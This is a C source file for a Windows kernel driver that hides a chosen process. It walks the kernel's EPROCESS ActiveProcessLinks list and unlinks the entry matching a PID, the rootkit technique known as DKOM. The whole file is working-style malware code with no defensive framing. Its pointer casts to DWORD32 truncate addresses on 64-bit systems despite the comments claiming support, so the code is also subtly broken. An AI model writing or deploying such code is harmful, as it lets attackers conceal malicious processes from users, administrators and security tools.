#include "driver.h"


void modifyTaskList(UINT32 pid) {


	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = find_eprocess_pid_offset();

	// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks
	ULONG LIST_OFFSET = PID_OFFSET;


	// Check Architecture using pointer size
	INT_PTR ptr;

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	// Get current process
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	// Initialize other variables
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);


	// Check self 
	if (*(UINT32 *)CurrentPID == pid) {
		remove_links(CurrentList);
		return;
	}

	// Record the starting position
	PEPROCESS StartProcess = CurrentEPROCESS;

	// Move to next item
	CurrentEPROCESS = (PEPROCESS)((DWORD32)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);


	// Loop until we find the right process to remove
	// Or until we circle back
	while ((DWORD32)StartProcess != (DWORD32)CurrentEPROCESS) {

		// Check item
		if (*(UINT32 *)CurrentPID == pid) {
			remove_links(CurrentList);
			return;
		} 


		// Move to next item
		CurrentEPROCESS = (PEPROCESS)((DWORD32)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);
	}

	return;
}

void remove_links(PLIST_ENTRY Current) {

	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	// Loop over self (connect previous with next)
	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;
	
}